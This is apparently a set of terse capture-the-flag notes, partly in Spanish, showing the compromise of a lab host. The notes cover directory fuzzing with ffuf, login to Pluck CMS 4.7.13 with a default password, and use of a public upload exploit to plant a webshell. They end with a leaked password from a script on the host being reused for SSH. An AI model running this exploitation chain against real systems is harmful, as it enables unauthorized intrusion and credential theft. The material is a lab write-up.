


```
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://10.10.90.82/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt     
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.90.82/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4940ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 5941ms]
app                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 731ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 346ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

```
http://10.10.90.82/app/pluck-4.7.13/?file=dreaming
http://10.10.90.92/app/pluck-4.7.13/login.php
password
```

- exploit : https://www.exploit-db.com/exploits/49909
- se sube un webshell
```
python 49909.py 10.10.90.92 80 password /app/pluck-4.7.13

Authentification was succesfull, uploading webshell

Uploaded Webshell to: http://10.10.90.92:80/app/pluck-4.7.13/files/shell.phar

```


- http://10.10.90.92:80/app/pluck-4.7.13/files/shell.phar
```
p0wny@shell:/opt# cat test.py
import requests

#Todo add myself as a user
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "HeyLucien#@1999!"

data = {
        "cont1":password,
        "bogus":"",
        "submit":"Log+in"
        }

req = requests.post(url,data=data)

if "Password correct." in req.text:
    print("Everything is in proper order. Status Code: " + str(req.status_code))
else:
    print("Something is wrong. Status Code: " + str(req.status_code))
    print("Results:\n" + req.text)
```

- Usamos el password encontrado para ingresar por ssh

```
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh lucien@10.10.90.92  

```
